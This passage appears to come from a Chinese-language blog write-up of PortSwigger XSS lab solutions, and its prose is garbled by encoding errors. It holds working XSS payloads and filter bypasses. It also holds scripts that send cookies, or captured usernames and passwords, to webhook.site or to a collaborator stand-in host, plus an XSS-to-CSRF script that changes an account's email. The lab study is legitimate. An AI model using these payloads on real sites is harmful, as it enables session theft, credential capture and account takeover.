</span><span>                </span><span style=color:#81a1c1>let </span><span>newInnerHtml </span><span style=color:#81a1c1>= </span><span>firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+ </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>author)
</span><span>                firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span>newInnerHtml
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>date) {
</span><span>                </span><span style=color:#81a1c1>let </span><span>dateObj </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>Date</span><span>(comment</span><span style=color:#81a1c1>.</span><span>date)
</span><span>                </span><span style=color:#81a1c1>let </span><span>month </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'' </span><span style=color:#81a1c1>+ </span><span>(dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getMonth</span><span>() </span><span style=color:#81a1c1>+ </span><span style=color:#b48ead>1</span><span>)</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>let </span><span>day </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'' </span><span style=color:#81a1c1>+ </span><span>dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getDate</span><span>()</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>let </span><span>year </span><span style=color:#81a1c1>= </span><span>dateObj</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getFullYear</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>if </span><span>(month</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>2</span><span>)
</span><span>                    month </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'0' </span><span style=color:#81a1c1>+ </span><span>month</span><span style=color:#eceff4>;
</span><span>                </span><span style=color:#81a1c1>if </span><span>(day</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>2</span><span>)
</span><span>                    day </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'0' </span><span style=color:#81a1c1>+ </span><span>day</span><span style=color:#eceff4>;
</span><span>
</span><span>                dateStr </span><span style=color:#81a1c1>= </span><span>[day</span><span style=color:#eceff4>, </span><span>month</span><span style=color:#eceff4>, </span><span>year]</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>join</span><span>(</span><span style=color:#a3be8c>'-'</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>let </span><span>newInnerHtml </span><span style=color:#81a1c1>= </span><span>firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>" | " </span><span style=color:#81a1c1>+ </span><span>dateStr
</span><span>                firstPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span>newInnerHtml
</span><span>            }
</span><span>
</span><span>            firstPElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(avatarImgElement)</span><span style=color:#eceff4>;
</span><span>
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(firstPElement)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>body) {
</span><span>                </span><span style=color:#81a1c1>let </span><span>commentBodyPElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>                commentBodyPElement</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>body)</span><span style=color:#eceff4>;
</span><span>
</span><span>                commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(commentBodyPElement)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>))</span><span style=color:#eceff4>;
</span><span>
</span><span>            userComments</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(commentSection)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }
</span><span>}</span><span style=color:#eceff4>;
</span></code></pre><p>js ä¸­<code>replace</code>åªä¼šæ›¿æ¢å­—ç¬¦çš„ç¬¬ä¸€æ¬¡å‡ºç°ã€‚æ‰€ä»¥ content å¡«å…¥<code><>&LTimg src=x onerror=alert(window.origin)/></code>å¯ä»¥ç›´æ¥è¿‡<p><em>è¿™é‡Œå‘ç° svg å¥½åƒä¸èƒ½åœ¨ p å…ƒç´ é‡Œç”¨ å°è®°ä¸€ä¸‹</em><p>ç„¶åå†æµ‹è¯•äº†çœ‹èµ·æ¥å¥½åƒå­˜åœ¨çš„<code>Obfuscating attacks via HTML encoding</code>ã€‚ç”±äºæå–æ–‡å­—ç”¨çš„æ˜¯<code>innerHTML</code>è€Œä¸æ˜¯<code>innerText</code>æ— æ³•å®ç°ã€‚<h2 id=lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into HTML context with most tags and attributes blocked</h2><p>ä¹‹å‰æŒ–è‡ªå·±å­¦æ ¡é‡åˆ°è¿‡<a href=https://src.sjtu.edu.cn/post/237670/>ç±»ä¼¼çš„</a>ï¼Œä¸è¿‡æ˜¯å­˜å‚¨å‹çš„ã€‚ä¹Ÿå°±æ˜¯ <a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>cheet sheet</a> æ‰¾ä¸€ä¸ªä¸å¸¸è§çš„å±æ€§ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>123"></span><span style=color:#81a1c1>&LTstyle></span><span style=color:#d08770>@</span><span style=color:#81a1c1>keyframes </span><span style=color:#eceff4>x{}</span><span style=color:#81a1c1>&LT/style>&LTinput </span><span style=color:#8fbcbb>style</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span>animation-name</span><span style=color:#eceff4>:x</span><span style=color:#a3be8c>" </span><span style=color:#8fbcbb>onanimationend</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"1+1;b=document;a=window.alert;a(b.cookie)"</span><span style=color:#d8dee9;background-color:#bf616a><</span><span style=color:#eceff4>/</span><span style=color:#8fbcbb>input</span><span style=color:#81a1c1>></span><span style=color:#eceff4>"
</span></code></pre><p><del><em>è¿™ä¸ªå­˜å‚¨å‹+å¯¼è‡´ç™»å½•å‡­è¯æ³„éœ²ç«Ÿç„¶ç»™æˆ‘ä½å±ğŸ« ã€‚ã€‚</em></del><p>è¿™é¢˜çš„åˆæ³•tagå’Œattributeså±å®éš¾æ‰¾ã€‚ä¸æƒ³å†™æ‰¹é‡æ£€æµ‹çš„ï¼Œé‚æŠ„ç­”æ¡ˆäº†<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>"></span><span style=color:#81a1c1>&LTbody </span><span style=color:#8fbcbb>onresize</span><span style=color:#eceff4>=</span><span style=color:#8fbcbb>print()</span><span style=color:#81a1c1>>
</span></code></pre><p><code>onresize</code>äº‹ä»¶åœ¨<code>çª—å£æˆ–æ¡†æ¶è¢«è°ƒæ•´å¤§å°æ—¶</code>å‘ç”Ÿã€‚ç”±äºç»™äº†exploit-serverï¼Œç”¨ iframe ä¿®æ”¹æ¡†æ¶å¤§å°<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTiframe </span><span style=color:#8fbcbb>src</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" </span><span style=color:#8fbcbb>onload</span><span style=color:#eceff4>=</span><span style=color:#8fbcbb>this.style.width</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>'100px'</span><span style=color:#81a1c1>>
</span></code></pre><p>é¢˜è§£æ˜¯ç”¨çš„ <code>burp Intruder</code>æ£€æµ‹ã€‚çœ‹æ¥ xss å­—å…¸è¿˜æ˜¯æœ‰å¿…è¦çš„ã€‚<h2 id=lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into HTML context with all tags blocked except custom ones</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search=</span><span style=color:#81a1c1>&LTxss+id%3Dx+onfocus%3Dalert(document.cookie)%20tabindex=1></span><span style=color:#eceff4>#x
</span></code></pre><p>ç”¨<code>location.hash</code>é…åˆ id è‡ªåŠ¨ focus åˆ°å…ƒç´ ä¸Šè§¦å‘ onfocus äº‹ä»¶ã€‚å­¦åˆ°äº†<p>exploit-server å¯ä»¥ç”¨ meta refresh è·³è½¬<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTmeta </span><span style=color:#8fbcbb>http-equiv</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"refresh" </span><span style=color:#8fbcbb>content</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"0; url='https://0a6400b20383db3782698d65007c00b9.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'"</span><span style=color:#81a1c1>>
</span></code></pre><h2 id=lab-reflected-xss-with-some-svg-markup-allowed>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with some SVG markup allowed</h2><p>è¿™ä¸€å…³æ²¡æœ‰å­—ç¬¦å¤„ç†ï¼Œåªæœ‰è¿”å›é»‘åå•ã€‚<p><a href=https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>XSS Cheet Sheet</a> æœ‰ä¸ªåŠŸèƒ½æ˜¯ Copy tags/event/payloadsï¼Œå’Œ<code>Burp Suite</code>çš„ Intruder åŠŸèƒ½æ ¼å¼ä¹Ÿå¯¹æ¥å¥½äº†ã€‚å¯ä»¥ç›´æ¥ Copy-Paste åˆ° payloads é‡Œ<p>æµ‹è¯•å‘ç°åªæœ‰<code>&LTsvg></code>ã€<code>&LTanimatetransform></code>ã€<code>&LTtitle> </code>å’Œ <code>&LTimage></code>æ˜¯ valid tagã€‚ç„¶åæµ‹è¯•<code>&LTsvg></code>çš„å±æ€§/äº‹ä»¶ï¼Œå‘ç°å…¨éƒ¨invalidã€‚<code>&LTsvg></code>è¿˜æœ‰åé¢è¿æ¥<code>animatetransform</code>ã€<code>animatemotion</code>ã€<code>animate</code>çš„ç”¨æ³•ï¼Œæµ‹è¯•å‘ç°<code>animatetransform</code>å¯ä»¥ä½¿ç”¨<p>ç„¶åå†å¯¹<code>animatetransform</code>çš„äº‹ä»¶/å±æ€§è¿›è¡Œæµ‹è¯•ï¼Œ<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search="></span><span style=color:#81a1c1>&LTsvg>&LTanimatetransform </span><span style=color:#8fbcbb>onbegin</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>alert(1)</span><span style=color:#81a1c1>>
</span></code></pre><h2 id=lab-reflected-xss-in-canonical-link-tag>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> in canonical link tag</h2><p>åç«¯ç•Œé¢æ¸²æŸ“ã€‚ä¼šæŠŠ<code>&LTlink rel="canonical" href="https://0a6e00520312cce98c1ab92f007d0027.web-security-academy.net/?[input]"></code>æ¸²æŸ“åˆ°canonical headé‡Œé¢ã€‚<p><a href=https://www.1deng.me/canonical-url.html#shen_me_shi_canonical_URL_biao_qian>canonical</a>æ ‡ç­¾ è¢«ç§°ä½œè§„èŒƒç½‘å€ï¼Œæ˜¯ç”¨æ¥ç»™çˆ¬è™«æœºå™¨äººçœ‹çš„ï¼ˆé…ç½®å¯ä»¥æé«˜SEOï¼‰<p>é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ³¨å…¥å±æ€§ã€‚é¢˜è§£ç»™å‡ºçš„å±æ€§æ˜¯<code>accesskey</code>ï¼Œç”±é”®ç›˜è§¦å‘ã€‚å¦å¤–æ³¨å…¥çš„å…¶ä»–å±æ€§ä¼¼ä¹åœ¨canonicalä¸‹ä¸ç”Ÿæ•ˆã€‚<p>![image-20230912144444581](webacademy XSS/image-20230912144444581.png)<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?'accesskey='x'onclick='alert(document.domain)
</span></code></pre><h2 id=lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with single quote and backslash escaped</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'{{inupt}}'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>é”™è¯¯çš„è½¬ä¹‰ç­–ç•¥ï¼šæ²¡æœ‰è½¬ä¹‰æ–œæ å’Œå°–æ‹¬å·ã€‚<p>ç›´æ¥æ³¨å…¥<code>&LTscript></code>æ ‡ç­¾ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LT/script>&LTscript></span><span style=color:#88c0d0>alert</span><span style=color:#eceff4>(</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>domain)</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-into-a-javascript-string-with-angle-brackets>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with angle brackets</h2><p>å‰ç«¯æ¸²æŸ“<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'{{input}}'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>åæ–œæ æ²¡æœ‰è¢«æ­£ç¡®è½¬ä¹‰<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span>\</span><span style=color:#a3be8c>'-alert(document.domain)/</span><span style=color:#d8dee9;background-color:#bf616a>/</span><span>
</span></code></pre><h2 id=lab-stored-xss-into-onclick-event-with-angle-brackets-and-double>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/stored>Stored XSS</a> into <code>onclick</code> event with angle brackets and double</h2><p>å­˜å‚¨å‹ã€‚åç«¯æ¸²æŸ“<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTa </span><span style=color:#8fbcbb>id</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"author" </span><span style=color:#8fbcbb>href</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://ww.adsd" </span><span style=color:#8fbcbb>onclick</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>var </span><span>tracker</span><span style=color:#81a1c1>=</span><span style=color:#eceff4>{</span><span style=color:#88c0d0>track</span><span style=color:#eceff4>(){}};</span><span>tracker</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>track</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'{{website}}'</span><span style=color:#eceff4>);</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>></span><span style=color:#eceff4>1234</span><span style=color:#81a1c1>&LT/a>
</span></code></pre><p>å•åŒå¼•å·ã€åæ–œæ å‡è¿‡æ»¤ã€‚è€Œonclickäº‹ä»¶åœ¨è§¦å‘æ—¶ä¼šè¿›è¡Œä¸€æ¬¡htmlå®ä½“è§£ç <pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>http://foo?&ampapos;-alert(document.domain)-&ampapos;
</span></code></pre><h2 id=lab-reflected-xss-into-a-template-literal-with-angle-brackets>Lab: Reflected XSS into a template literal with angle brackets,</h2><p>åç«¯æ¸²æŸ“ï¼Œä½†æ˜¯è¯¥è½¬ä¹‰çš„éƒ½è½¬ä¹‰äº†ã€‚<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>message </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>`0 search results for '{{input}}'`</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementById</span><span>(</span><span style=color:#a3be8c>'searchMessage'</span><span>)</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>message</span><span style=color:#eceff4>;
</span></code></pre><p>ä½†æ˜¯æ¸²æŸ“çš„å­—ç¬¦ä¸²åœ¨ js ä¸­è¢«é£˜å·ï¼ˆåå¼•å·ï¼‰åŒ…è£¹ã€‚ç”¨ js æ ¼å¼åŒ–å­—ç¬¦ä¸²xssã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#eceff4>/?search=${alert(document.domain)}
</span></code></pre><h2 id=lab-exploiting-cross-site-scripting-to-steal-cookies>Lab: Exploiting cross-site scripting to steal cookies</h2><p>æƒ³ç€ç®€å•ä¸€ç‚¹ç›´æ¥æ”¹locationç»“æœæ‰¾ä¸åˆ°report..ç„¶åæ‰å‘ç°åªå…è®¸ä½¿ç”¨burpæä¾›çš„å…¬å…±æœåŠ¡å™¨<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span style=color:#8fbcbb>window</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>location</span><span style=color:#81a1c1>=</span><span style=color:#a3be8c>'https://webhook.site/cb9f69b1-bad8-46f1-8a14-a8249b19b89f/?cookie='</span><span style=color:#81a1c1>+</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>cookie</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p>åæ­£æ˜¯å¯¹è‡ªå·± xss æˆåŠŸäº†ã€‚é‚£å°±å½“æˆ‘è§£å‡ºäº†å§ğŸ’¦ğŸ’¦<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span style=color:#eceff4>, {
</span><span style=color:#eceff4>method: </span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>body:</span><span style=color:#8fbcbb>document</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>cookie
</span><span style=color:#eceff4>});
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p>**POSTçš„æ–¹å¼<h2 id=lab-exploiting-cross-site-scripting-to-capture-passwords>Lab: Exploiting cross-site scripting to capture passwords</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTinput </span><span style=color:#8fbcbb>name</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>username </span><span style=color:#8fbcbb>id</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>username</span><span style=color:#81a1c1>>
</span><span style=color:#81a1c1>&LTinput </span><span style=color:#8fbcbb>type</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>password </span><span style=color:#8fbcbb>name</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>password </span><span style=color:#8fbcbb>onchange</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>if</span><span style=color:#eceff4>(</span><span style=color:#81a1c1>this.</span><span style=color:#eceff4>value</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>length)</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span style=color:#eceff4>,{
</span><span style=color:#eceff4>method:</span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>body:</span><span>username</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>value</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>':'</span><span style=color:#81a1c1>+this.</span><span style=color:#eceff4>value
</span><span style=color:#eceff4>});</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>>
</span></code></pre><p>HTMLæ³¨å…¥ğŸ¤”ä»¥å‰æ²¡çœ‹è¿‡ã€‚ä¸è¿‡ä¹Ÿç¡®å®æ˜¯ä¸€ç§æ‹¿å¯†ç çš„æ”»å‡»æ–¹å¼ã€‚<h2 id=lab-exploiting-xss-to-perform-csrf>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/exploiting>Exploiting XSS</a> to perform CSRF</h2><p>åˆ©ç”¨ XSS åˆ° CSRFã€‚å› ä¸ºæœ‰ csrf token æ‰€ä»¥è¦ç‰¹åˆ«å¤„ç†<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#eceff4>(</span><span style=color:#81a1c1>async</span><span style=color:#eceff4>() </span><span style=color:#81a1c1>=> </span><span style=color:#eceff4>{
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>email </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'gtg@thebearhimself.rest'</span><span style=color:#eceff4>;
</span><span style=color:#eceff4>	</span><span style=color:#81a1c1>var </span><span>csrf </span><span style=color:#81a1c1>= await </span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'/my-account'</span><span style=color:#eceff4>)
</span><span style=color:#eceff4>		</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>then</span><span style=color:#eceff4>((</span><span>response</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>=></span><span style=color:#eceff4>{</span><span style=color:#81a1c1>return </span><span>response</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>text</span><span style=color:#eceff4>();})
</span><span style=color:#eceff4>		</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>then</span><span style=color:#eceff4>((</span><span>html</span><span style=color:#eceff4>)</span><span style=color:#81a1c1>=></span><span style=color:#eceff4>{</span><span style=color:#81a1c1>return </span><span>html</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>match</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>/</span><span style=color:#ebcb8b>(?<=value\=")</span><span>[A-Za-z0-9]</span><span style=color:#81a1c1>+</span><span style=color:#ebcb8b>(?=")</span><span style=color:#a3be8c>/</span><span style=color:#eceff4>)[</span><span style=color:#b48ead>0</span><span style=color:#eceff4>];});
</span><span style=color:#eceff4>	</span><span style=color:#88c0d0>fetch</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'/my-account/change-email'</span><span style=color:#eceff4>,{
</span><span style=color:#eceff4>    	method: </span><span style=color:#a3be8c>'POST'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>		mode: </span><span style=color:#a3be8c>'no-cors'</span><span style=color:#eceff4>,
</span><span style=color:#eceff4>    	headers: {
</span><span style=color:#eceff4>    		</span><span style=color:#a3be8c>'Content-Type'</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'application/x-www-form-urlencoded'
</span><span style=color:#eceff4>    	},
</span><span style=color:#eceff4>		body: </span><span style=color:#a3be8c>`email=</span><span style=color:#eceff4>${</span><span>email</span><span style=color:#eceff4>}</span><span style=color:#a3be8c>&csrf=</span><span style=color:#eceff4>${</span><span>csrf</span><span style=color:#eceff4>}</span><span style=color:#a3be8c>`
</span><span style=color:#eceff4>	})
</span><span style=color:#eceff4>})();
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><p><del>tbh å› ä¸ºconsoleå’Œpageçš„å¼‚æ­¥å·®å¼‚å¡äº†è®¸ä¹…</del><p>é¢˜è§£ç»™çš„ç”¨çš„æ˜¯å¤è€çš„<code>XMLHttpRequest</code>apiï¼š<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript>
</span><span style=color:#81a1c1>var </span><span>req </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span style=color:#eceff4>();
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>onload </span><span style=color:#81a1c1>= </span><span>handleResponse</span><span style=color:#eceff4>;
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'get'</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>'/my-account'</span><span style=color:#eceff4>,</span><span style=color:#81a1c1>true</span><span style=color:#eceff4>);
</span><span>req</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span style=color:#eceff4>();
</span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>handleResponse</span><span style=color:#eceff4>() {
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>token </span><span style=color:#81a1c1>= this.</span><span style=color:#eceff4>responseText</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>match</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>/</span><span style=color:#ebcb8b>name="csrf" value="(</span><span>\w</span><span style=color:#81a1c1>+</span><span style=color:#ebcb8b>)"</span><span style=color:#a3be8c>/</span><span style=color:#eceff4>)[</span><span style=color:#b48ead>1</span><span style=color:#eceff4>];
</span><span style=color:#eceff4>    </span><span style=color:#81a1c1>var </span><span>changeReq </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span style=color:#eceff4>();
</span><span style=color:#eceff4>    </span><span>changeReq</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'post'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'/my-account/change-email'</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>true</span><span style=color:#eceff4>);
</span><span style=color:#eceff4>    </span><span>changeReq</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'csrf='</span><span style=color:#81a1c1>+</span><span>token</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&email=test@test.com'</span><span style=color:#eceff4>)
</span><span style=color:#eceff4>};
</span><span style=color:#81a1c1>&LT/script>
</span></code></pre><h2 id=lab-reflected-xss-with-angularjs-sandbox-escape-without-strings>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> with AngularJS sandbox escape without strings</h2><pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTscript></span><span>angular</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>module</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'labApp'</span><span style=color:#eceff4>, [])</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>controller</span><span style=color:#eceff4>(</span><span style=color:#a3be8c>'vulnCtrl'</span><span style=color:#eceff4>,</span><span style=color:#81a1c1>function</span><span style=color:#eceff4>(</span><span>$scope</span><span style=color:#eceff4>, </span><span>$parse</span><span style=color:#eceff4>) {
</span><span>$scope</span><span style=color:#81a1c1>.</span><span style=color:#eceff4>query </span><span style=color:#81a1c1>= </span><span style=color:#eceff4>{};
</span><span style=color:#81a1c1>var </span><span>key </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'search'</span><span style=color:#eceff4>;
